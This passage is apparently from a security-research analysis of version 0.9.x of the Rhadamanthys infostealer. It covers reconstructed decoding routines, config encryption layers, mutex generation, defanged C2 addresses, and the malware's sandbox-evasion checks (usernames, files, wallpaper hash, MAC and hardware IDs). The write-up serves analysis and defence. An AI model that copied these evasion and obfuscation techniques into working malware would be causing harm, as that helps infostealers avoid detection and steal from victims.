&lt;p&gt;The major change that we can observe is a lack of the WORD field before the header size. In the previous version (XS1_A) this field stood for the key that was used for deobfuscating the names of the DLLs, used in the custom Import Table. Now this field is removed, because&amp;nbsp;&lt;a href="https://github.com/hasherezade/hidden_bee_tools/blob/75cf8cc9d1252c09b95166e4b0512f0ac2e5c986/bee_lvl2_converter/xs_exe.cpp#L222"&gt;the deobfuscating algorithm&lt;/a&gt;&amp;nbsp;has been replaced with&amp;nbsp;&lt;a href="https://github.com/hasherezade/hidden_bee_tools/blob/75cf8cc9d1252c09b95166e4b0512f0ac2e5c986/bee_lvl2_converter/xs_exe.cpp#L250"&gt;the new one&lt;/a&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;bool decode_name_B(BYTE* dll_name, size_t name_len)
{
    if (!name_len) {
        return false;
    }

    BYTE out_name[128] = { 0 };
    size_t indx = 0;
    size_t pos = 0;
    size_t flag = 0;

    for (size_t i = 0; i &amp;lt; name_len; ++i) {
        BYTE outC = 0;
        for (WORD round = 7; round &gt; 0; round--) {
            BYTE val = dll_name[indx];
            if (pos) {
                flag = (val &gt;&gt; (7 - pos)) &amp;amp; 1;
                if (pos == 7) {
                    pos = 0;
                    ++indx;
                }
                else {
                    ++pos;
                }
            }
            else {
                flag = val &gt;&gt; 7;
                pos = 1;
            }
            outC |= (flag != 0) &amp;lt;&amp;lt; (round - 1);
        }
        if (!is_valid_dll_char(outC)) {
            return false;
        }
        out_name[i] = outC;
    }
    out_name[name_len] = 0;
    ::memcpy(dll_name, out_name, name_len);
    return true;
}&lt;/pre&gt;



&lt;p&gt;Still, the malware uses an import deobfuscation key (&lt;code&gt;imp_key&lt;/code&gt;) to resolve imported functions. This time the key is shorter, only one BYTE long. It is used in&amp;nbsp;&lt;a href="https://github.com/hasherezade/hidden_bee_tools/blob/75cf8cc9d1252c09b95166e4b0512f0ac2e5c986/bee_lvl2_converter/xs_exe.cpp#L429"&gt;calculating checksums&lt;/a&gt;&amp;nbsp;that are then mapped to particular functions’ names.&lt;/p&gt;



&lt;p&gt;The next stage format (XS2_B) underwent some lighter modifications. The only thing that changed was one of the fields in the custom import structure: it was extended from WORD to DWORD. This field carries the name of the DLL. In the past it could be carried in an obfuscated form, now it is used as is.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;#pragma pack(push, 1) // Adjust to one byte
        typedef struct {
            DWORD dll_name_rva;
            DWORD first_thunk;
            DWORD original_first_thunk;
            **DWORD obf_dll_len; //WORD obf_dll_len;**
        } t_XS_import_B;
#pragma pack(pop) // Back to the previous settings&lt;/pre&gt;



&lt;p&gt;As we can see, the changes do not add any new qualities to the format. The most likely role of the restructuring is to invalidate earlier parsers. It reflects the ongoing pattern of incremental churn aimed at slowing analysts down.&lt;/p&gt;



&lt;p&gt;All the changes are now reflected in the updates to&amp;nbsp;&lt;a href="https://github.com/hasherezade/hidden_bee_tools/releases"&gt;our tool&lt;/a&gt;, and the new modules can be successfully converted into PE.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="changes-in-the-initial-checks-stage-2-core"&gt;Changes in the initial checks (Stage 2 core)&lt;/h2&gt;



&lt;p&gt;The Stage 2 core, implemented as an XS1 module, starts its execution with various checks that are used to decide if the malware should continue its execution. Most of them have not changed since earlier versions. However, some underwent makeovers.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="removal-of-the-sibcode-key"&gt;Removal of the SibCode key&lt;/h3&gt;



&lt;p&gt;In the past, in consecutive versions of Rhadamanthys, it used the&amp;nbsp;&lt;code&gt;SibCode&lt;/code&gt;&amp;nbsp;registry keys in order to save the timestamp of the last execution. Depending on the version, the keys may look like one of the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;HKCU\SOFTWARE\SibCode\sn&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;HKCU\SOFTWARE\SibCode\sn2&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;HKCU\SOFTWARE\SibCode\sn3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;It was introduced to prevent the sample from being executed again too quickly after the first deployment. While initially the timestamp was saved as a single DWORD, in consecutive releases the author put more effort into making it tamper-proof. It was described in detail in [&lt;a href="https://go.recordedfuture.com/hubfs/reports/mtp-2024-0926.pdf"&gt;4&lt;/a&gt;] under “Re-Execution Delay Feature”. The presence of this registry key was one of the easy-to-notice symptoms of Rhadamanthys infection. This is probably the reason why the author gave it up completely, mentioning in the 0.9.1 changelog:&amp;nbsp;&lt;em&gt;“Build stub completely removed registry write operations”&lt;/em&gt;&lt;strong&gt;.&lt;/strong&gt;&amp;nbsp;Indeed by checking the code we can confirm that the relevant function is now absent.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="mutex-creation"&gt;Mutex creation&lt;/h3&gt;



&lt;p&gt;In the earlier releases, Rhadamanthys used to create its mutex in a somewhat repeatable manner, based on a hash made of hardcoded values. This allowed researchers to create a universal vaccine (described in [&lt;a href="https://go.recordedfuture.com/hubfs/reports/mtp-2024-0926.pdf"&gt;4&lt;/a&gt;]). Now, the author decided to evade this simple way of preventing the malware from running.&lt;/p&gt;



&lt;p&gt;Since 0.9, the Rhadamanthys configuration (described further) includes a 16-byte seed value that participates in mutex name generation. It is hashed along with the magic&amp;nbsp;&lt;code&gt;XRHY&lt;/code&gt;. The first 16 bytes of the hash are then split into chunks and formatted into the Mutex name:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 9 - Fragment of the function responsible for generation of the
Mutex name" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId65.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; Fragment of the function responsible for generation of the Mutex name&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Possible format strings for the generation of mutexes:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;"Global\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}"
"Session\%u\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}"
"MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}"&lt;/pre&gt;



&lt;p&gt;If creation of the first mutex option fails, the second is applied, with an index after “Session” that can be in the range 1-8.&lt;/p&gt;



&lt;p&gt;Depending on the flags set in the configuration, the mutex can be passed into all the processes where Rhadamanthys injects its modules (by duplicating the handle). This feature is enabled by default and disabled if the flag&amp;nbsp;&lt;code&gt;0x40&lt;/code&gt;&amp;nbsp;or&amp;nbsp;&lt;code&gt;0x20&lt;/code&gt;&amp;nbsp;is set. Knowing this, we can search for the handle of the mutex in other processes, to check which belong to the same Rhadamanthys execution tree.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="new-configuration-rh-v0.9.x"&gt;New configuration (RH v0.9.x)&lt;/h2&gt;



&lt;p&gt;The main Rhadamanthys module is shipped with an obfuscated configuration, which is decrypted and parsed at the beginning of the execution. It contains the C2 address, encryption keys used along the way, and various flags that specify which features of the malware will be enabled or disabled. This configuration has evolved considerably across consecutive versions. The explanation of the used fields in a relatively new version (0.7) has been provided in [&lt;a href="https://go.recordedfuture.com/hubfs/reports/mtp-2024-0926.pdf"&gt;4&lt;/a&gt;].&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 6 - Rhadamanthys configuration in version 0.7, as described by
Recorded Future" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId70.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; Rhadamanthys configuration in version 0.7, as described by Recorded Future&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The magic&amp;nbsp;&lt;code&gt;0x59485221&lt;/code&gt;&amp;nbsp;(&amp;nbsp;&lt;code&gt;!RHY&lt;/code&gt;&amp;nbsp;) has been used by this malware since the beginning of its existence. However, in the recent version 0.9.2, it is replaced with the&amp;nbsp;&lt;code&gt;0xBEEF&lt;/code&gt;&amp;nbsp;DWORD (first noted&amp;nbsp;&lt;a href="https://x.com/Threatlabz/status/1950949733935223110"&gt;here&lt;/a&gt;). Also, the configuration content has been significantly extended.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 7 - Rhadamanthys configuration in version 0.9 - the packed
format, starting with BE EF markers" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId74.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Rhadamanthys configuration in version 0.9 &amp;#8211; the packed format, starting with BE EF markers&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The unpacked configuration, starting with&amp;nbsp;&lt;code&gt;0xBEEF&lt;/code&gt;&amp;nbsp;markers, is not the final version but a compressed form. After the appropriate arguments are fetched, LZO decompression is applied. The result looks as follows:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 8 - Rhadamanthys configuration in version 0.9 - the unpacked
format" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId77.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Rhadamanthys configuration in version 0.9 &amp;#8211; the unpacked format&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;While in the past the config allowed one C2 per sample, multiple options are now allowed. Example:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;hxxps://193.233.126.43/gateway/iesm4j25.s4pj7
hxxps://193.23.216.48/gateway/iesm4j25.s4pj7&lt;/pre&gt;



&lt;p&gt;Structure illustrating the new config (after decompression):&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;struct config_new
{
  DWORD flags;
  DWORD unk0;
  BYTE aes_iv[16];
  BYTE mutex_seed[16];
  BYTE unk1[18];
  WORD padding;
  BYTE urls[256];
};&lt;/pre&gt;



&lt;h3 class="wp-block-heading" id="configuration-decoding"&gt;Configuration decoding&lt;/h3&gt;



&lt;p&gt;As in the previous version, the configuration is stored in the main sample as a Base64 string, encoded with a custom charset. In the current version, the charset used is:&amp;nbsp;&lt;code&gt;4NOPQRSTUVWXY567DdeEqrstuvwxyz-ABC1fghop23Fijkbc|lmnGHIJKLMZ089a&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;Layers of config deobfuscation before the&amp;nbsp;&lt;code&gt;0xBEEF&lt;/code&gt;&amp;nbsp;config blob is obtained are:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Base64 decoding with a custom charset&lt;/li&gt;



&lt;li&gt;ChaCha20 decryption, using the key and the IV stored at the beginning of the obtained blob&lt;/li&gt;



&lt;li&gt;CBC XOR shuffle&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;After that, the configuration is decompressed with&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Oberhumer"&gt;LZO algorithm&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;This model of configuration was also observed in the version 0.9, and 0.9.1. While 0.9.2 changed the marker to&amp;nbsp;&lt;code&gt;0xBEEF&lt;/code&gt;, the older variants continued to use the known&amp;nbsp;&lt;code&gt;RHY!&lt;/code&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="config-flags"&gt;Config flags&lt;/h3&gt;



&lt;p&gt;The config contains the field&amp;nbsp;&lt;code&gt;flags&lt;/code&gt;&amp;nbsp;values of which are used to off and on some possible execution paths. Overview:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Flag&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Meaning&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Read/Written&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;0x2&lt;/td&gt;&lt;td&gt;init: the config was decrypted successfuly&lt;/td&gt;&lt;td&gt;W&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x10&lt;/td&gt;&lt;td&gt;delete initial file&lt;/td&gt;&lt;td&gt;R,W&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x20&lt;/td&gt;&lt;td&gt;close mutex (as in 0x40); use staging modules:&amp;nbsp;&lt;code&gt;stage.x86&lt;/code&gt;,&amp;nbsp;&lt;code&gt;early.x86&lt;/code&gt;/&amp;nbsp;&lt;code&gt;early.x64&lt;/code&gt;&lt;/td&gt;&lt;td&gt;R,W&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0x40&lt;/td&gt;&lt;td&gt;close mutex handle; do not pass the mutex to further injected processes&lt;/td&gt;&lt;td&gt;R&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="fetching-modules-by-checksums-stage-2"&gt;Fetching modules by checksums (Stage 2)&lt;/h2&gt;



&lt;p&gt;As mentioned earlier, the important modules of the malware are stored in an internal package and retrieved on demand.&lt;/p&gt;



&lt;p&gt;In the past versions, modules were&amp;nbsp;&lt;a href="https://speakerdeck.com/hshrzd/rhadamanthys-and-the-40-thieves-the-nuts-bolts-and-lineage-of-a-multimodular-stealer?slide=47"&gt;fetched from the package by their names, or even full paths relative to the internal filesystem&lt;/a&gt;. This made researchers’ job easier, since we were able to infer functionality just by looking at the name. Now the authors has moved toward obfuscation and has hidden the names. The modules are represented by checksums.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 10 - After the package is unpacked, specific modules are
fetched by their checksums" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId85.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 &amp;#8211; After the package is unpacked, specific modules are fetched by their checksums&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The reconstructed package structure (Stage 2):&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;typedef struct DATA_DIR {
    struct {
        uint32_t header_rel_off;
        uint32_t checksum;
    };
} _DATA_DIR;

typedef struct DATA_RECORD {
    struct {
        uint32_t size;
        uint8_t offset[1];
    };
} _DATA_RECORD;

typedef struct PACKAGE {
    uint32_t total_size;
    uint16_t reserved;
    uint16_t xor_key;
    uint32_t dir_offset;
    uint16_t data_offset;
    uint8_t file_count;
    uint8_t  blk_shift;
    _DATA_DIR dir[1];
} _PACKAGE;&lt;/pre&gt;



&lt;p&gt;Whenever modules are about to be retrieved, the raw package, that is shipped as hardcoded in the initial executable, is first decrypted and decompressed. Each time it is done, a fresh XOR key is set for the obfuscation of the modules. We can observe this inside the &lt;code&gt;decode_package&lt;/code&gt;&amp;nbsp;function:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31967" height="527" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId88.png" width="529" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; Inside the function responsible for unpacking the package. After decompression, the modules are obfuscated by XOR with a random key.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Once the key is generated, the decompressed content of the package is obfuscated, using a simple XOR-based obfuscation. This way, the authors try to minimize the content that is exposed to memory dumping tools.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;void xor_based_enc_dec(
    const uint8_t* src,
    std::size_t size,
    uint8_t* dst,
    uint16_t key)
{
    for (std::size_t i = 0; i &amp;lt; size; ++i) {
        dst[i] = src[i] ^ static_cast&amp;lt;uint8_t&gt;(key);
        uint16_t lsb = key &amp;amp; 1u;
        key &gt;&gt;= 1;
        if (lsb) key ^= 0xB400u;
    }
}&lt;/pre&gt;



&lt;p&gt;The same XOR-based function is then used to reverse the obfuscation, when the individual module is about to be retrieved. It is done by the function denoted as&amp;nbsp;&lt;code&gt;fetch_from_package&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;The reconstructed algorithm (&lt;code&gt;fetch_from_package&lt;/code&gt;) is given below:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;BYTE* fetch_from_package(PACKAGE* pkg, uint32_t wanted_checksum, size_t&amp;amp; out_size)
{
    BYTE* base_data = (BYTE*)&amp;amp;pkg-&gt;dir_offset + pkg-&gt;data_offset;
    size_t chunk_size = 2 &amp;lt;&amp;lt; pkg-&gt;blk_shift;

    for (size_t i = 0; i &amp;lt; pkg-&gt;file_count; i++) {
        if (wanted_checksum != pkg-&gt;dir[i].checksum) continue;

        std::cout &amp;lt;&amp;lt; std::dec &amp;lt;&amp;lt; i &amp;lt;&amp;lt; "\t Checksum: " &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; pkg-&gt;dir[i].checksum &amp;lt;&amp;lt; "\t";
        std::cout &amp;lt;&amp;lt; "Offset: " &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; pkg-&gt;dir[i].header_rel_off &amp;lt;&amp;lt; "\n";

        DATA_RECORD* rec = (DATA_RECORD*)(reinterpret_cast&amp;lt;ULONG_PTR&gt;(&amp;amp;pkg-&gt;dir_offset) + pkg-&gt;dir[i].header_rel_off);

        size_t chunks_count = rec-&gt;size / chunk_size;
        if (rec-&gt;size % chunk_size) ++chunks_count;

        BYTE* buf = (BYTE*)::calloc(rec-&gt;size, 1);
        if (!buf) break;

        size_t size_decoded = 0;
        for (size_t j = 0; j &amp;lt; chunks_count; j++) {
            uint8_t offset = rec-&gt;offset[j];
            size_t src_ofs = chunk_size * offset;

            size_t curr_size = chunk_size;
            size_t remaining = rec-&gt;size - size_decoded;

            if (curr_size &gt; remaining) {
                curr_size = remaining;
            }
            xor_based_enc_dec(&amp;amp;base_data[src_ofs], curr_size, buf + size_decoded, pkg-&gt;xor_key);
            size_decoded += curr_size;
        }

        out_size = size_decoded;
        return buf;
    }
    return nullptr;
}&lt;/pre&gt;



&lt;p&gt;With the help of our decoder, once you dumped the decompressed package, you can automatically list all the included modules, and unpack them into separate files.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://github.com/hasherezade/malware_analysis/blob/master/rhadamanthys/v0.9/rhad_stage2_decoder.cpp"&gt;malware_analysis/rhadamanthys/v0.9/rhad_stage2_decoder.cpp at master · hasherezade/malware_analysis · GitHub&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Although the names of modules are now not preserved, we were able to map modules to their previous names by comparing sizes and the common code pattern. The resulting listing is provided in the Appendix A.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="additions-in-the-evasion-module"&gt;Additions in the evasion module&lt;/h2&gt;



&lt;p&gt;The initial package, shipped in the sample, contains multiple modules that are dedicated to evasion. They are&amp;nbsp;&lt;a href="https://speakerdeck.com/hshrzd/rhadamanthys-and-the-40-thieves-the-nuts-bolts-and-lineage-of-a-multimodular-stealer?slide=42"&gt;run before the connection to C2 is established&lt;/a&gt;. One of them was previously named “Strategy”. Even though, since the recent changes, the name is no longer mentioned in the code, we will still use it to refer the corresponding module.&lt;/p&gt;



&lt;p&gt;“Strategy” is responsible for extensive environment checks, and detecting if the sample is running in a controlled environment, such as a sandbox, or a machine with analysis tools. In the past releases, it was shipped alongside a single configuration file:&amp;nbsp;&lt;code&gt;processes.x&lt;/code&gt;, containing the list of forbidden processes to be detected. The file was read from the package, and passed as an argument to the Strategy’s Entry Point. Now the module and its flexibility has been extended. First of all, we no longer pass just the previously fetched list, but the fetching function itself, along with the package. Thanks to this, the Strategy module can load multiple pieces of the needed configuration on demand.&lt;/p&gt;



&lt;p&gt;The first XS1 module (core), deploys Strategy passing to its Entry Point the pointer to the callback function, and the pointer to the package:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31968" height="450" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId94.png" width="666" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; The fragment of the code responsible for deploying the Strategy module. We can see the function&amp;nbsp;&lt;code&gt;fetch_from_package&lt;/code&gt;&amp;nbsp;together with the&amp;nbsp;&lt;code&gt;package&lt;/code&gt;&amp;nbsp;passed as arguments for further use from inside the module&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The Entry Point of the Strategy module is given below. The execution starts by using the callback function to retrieve the processes list:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31969" height="383" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId97.png" width="783" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 &amp;#8211; the function&amp;nbsp;&lt;code&gt;fetch_from_package&lt;/code&gt;&amp;nbsp;is called multiple times from inside the Strategy module. First to retrieve the list of processes.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;After enumerating running processes, and checking them against the forbidden list, the module performs other interesting checks. For example, it gets the current wallpaper, calculates its SHA1, and compares it with the hardcoded one:&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/16d5506b6663085b1acd80644ffa5363c158e390da67ed31298b85ddf0ad353f"&gt;&lt;code&gt;5b94362ac6a23c5aba706e8bfd11a5d8bab6097d&lt;/code&gt;&lt;/a&gt;&amp;nbsp;that represents the default wallpaper of the&amp;nbsp;&lt;a href="https://tria.ge/"&gt;Triage sandbox&lt;/a&gt;. It then checks for the presence of several sample files that are used in some of the sandbox environments: “foobar.jpg”, “foobar.mp3”, “foobar.txt”, “foobar.wri”, “waller.dat”. It checks the current username with the list of usernames typical for sandboxes, such as: “JohnDeo” (likely a typo in “JohnDoe”), “HAL9TH”, “JOHN”, “JOHN-PC”, “MUELLER-PC”, “george”, “DESKTOP-B0T”. It searches for files such as “keys.txt”, “passwords.txt”, and checks if their content is the same by comparing hashes &amp;#8211; this detects the presence of some dummy files that are common in sandboxes.&lt;/p&gt;



&lt;p&gt;If all those checks passed, it finally proceeds to the newly added function. This function needs a deeper explanation. It makes use of two new configuration files that are fetched from the package and processed in the appropriate loops.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - the function &amp;lt;code&amp;gt;fetch_from_package&amp;lt;/code&amp;gt; is called to
retrieve the two new configuration files." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId109.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; the function&amp;nbsp;&lt;code&gt;fetch_from_package&lt;/code&gt;&amp;nbsp;is called to retrieve the two new configuration files.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;To understand the meaning of the first configuration file, we need to take a deeper look at how it is processed. Inside the loop, a function is called that generates UUIDs and fetches the node value from it. The API used is&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidcreatesequential"&gt;&lt;code&gt;UuidCreateSequential&lt;/code&gt;&lt;/a&gt;, which means&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Universally_unique_identifier"&gt;&lt;strong&gt;UUID version 1&lt;/strong&gt;&lt;/a&gt;&amp;nbsp;is involved. This algorithm, defined by&amp;nbsp;&lt;a href="https://datatracker.ietf.org/doc/html/rfc4122"&gt;RFC 4122&lt;/a&gt;&amp;nbsp;has an interesting feature. The last part of the structure,&amp;nbsp;&lt;strong&gt;Node identifier&lt;/strong&gt;&amp;nbsp;(48 bits)&amp;nbsp;&lt;strong&gt;is a MAC address of a network interface&lt;/strong&gt;. This was designed in 1980, where the focus on privacy was much lower than it is currently, and MAC addresses were used because of they were guaranteed to be unique for each physical device (assigned by IEEE). Therefore, including the MAC address was the easiest way to ensure no two machines could generate identical UUIDs. Nowadays, this algorithm is considered obsolete. The modern version, UUID v4, doesn’t involve MAC addresses. However, the old UUIDv1 is still available for backward compatibility. The malware uses it for easy and stealthy fetching of MAC addresses from the infected machine. Next, it compares it against the hardcoded list. The listed MAC addresses represent known virtual interfaces. Full listing extracted from the sample can be found&amp;nbsp;&lt;a href="https://gist.github.com/hasherezade/af11786a670c76b60ecd29de00d6d9b8#file-macs-txt"&gt;here&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;The second configuration file contains another set of identifiers. This time they contain&amp;nbsp;&lt;strong&gt;HardWare IDs&lt;/strong&gt;&amp;nbsp;which will be compared against the HWID retrieved using a WQL query:&amp;nbsp;&lt;code&gt;"SELECT UUID FROM [&lt;a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-computersystemproduct"&gt;Win32_ComputerSystemProduct&lt;/a&gt;]"&lt;/code&gt;. This is yet another way to detect known sandboxes. The full listing extracted from the sample can be found&amp;nbsp;&lt;a href="https://gist.github.com/hasherezade/af11786a670c76b60ecd29de00d6d9b8#file-uuids-txt"&gt;here&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Some of the identifiers overlap with the blocklists used by the&amp;nbsp;&lt;a href="https://www.trellix.com/en-hk/blogs/research/skuld-the-infostealer-that-speaks-golang/"&gt;infostealer Skuld&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://www.zscaler.com/blogs/security-research/technical-analysis-bandit-stealer"&gt;Bandit Stealer&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Once the initial Rhadamanthys sample successfully cleared the environment as “safe to run”,&amp;nbsp;&lt;a href="https://speakerdeck.com/hshrzd/rhadamanthys-and-the-40-thieves-the-nuts-bolts-and-lineage-of-a-multimodular-stealer?slide=42"&gt;using multiple dedicated modules, it proceeds to download the next stage from the C2&lt;/a&gt;.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="bot-id-generated-from-volume-id"&gt;Bot ID generated from Volume ID&lt;/h2&gt;



&lt;p&gt;When the malware beacons to its C2 server, it sends the Bot ID uniquely identifying the victim system. Currently, the bot ID is generated using two unique identifiers.&lt;/p&gt;



&lt;p&gt;First, the malware retrieves a unique machine GUID from the from the registry:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography -&gt; MachineGuid&lt;/pre&gt;



&lt;p&gt;Next, it uses the Volume Serial Number retrieved by the API:&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getvolumeinformationw"&gt;&lt;code&gt;GetVolumeInformationW&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;They are hashed together, using the SHA1 algorithm. As the Bot ID is now strictly tied to those unique identifiers, it is easier for the attackers to blacklist some machines.&lt;/p&gt;



&lt;p&gt;The ID is further represented as a hexadecimal string.&lt;/p&gt;



&lt;p&gt;The same generator can be found in the Netclient (the element of Stage 2, responsible for the communication with the C2), as well as in the Stage 3 (the stealer core).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - the function generating the Bot ID, implemented inside the
Netclient module" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId114.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211; the function generating the Bot ID, implemented inside the Netclient module&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="next-stage-as-a-png"&gt;Next stage as a PNG&lt;/h2&gt;



&lt;p&gt;Downloading and decoding the main stage of Rhadamanthys (denoted as Stage 3) is managed by the Netclient module. For the first two years of its existence, the malware&amp;nbsp;&lt;a href="https://speakerdeck.com/hshrzd/rhadamanthys-and-the-40-thieves-the-nuts-bolts-and-lineage-of-a-multimodular-stealer?slide=45"&gt;shipped the package in a steganographic way: as a WAV file, or alternatively, as a JPG&lt;/a&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - fragment of the Netclient module (the old version). Two
callback functions are registered: to parse JPEG and WAV." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId119.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; fragment of the Netclient module (the old version). Two callback functions are registered: to parse JPEG and WAV.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The JPG was used in earlier versions of Rhadamanthys (up to 0.4.5), and the WAV was in a regular use in more recent versions. A very good breakdown of the implementation details of how its steganography was implemented, was given by&amp;nbsp;&lt;a href="https://www.youtube.com/watch?v=W62Eb5oodEY"&gt;Bea in her presentation at Botconf 2024&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;The Netclient module was significantly reworked since the latest version, 0.9.2. As before, the responsible function is installed as a callback fired up when a particular content type is encountered. This time, the expected type is&amp;nbsp;&lt;code&gt;image/png&lt;/code&gt;:&lt;/p&gt;


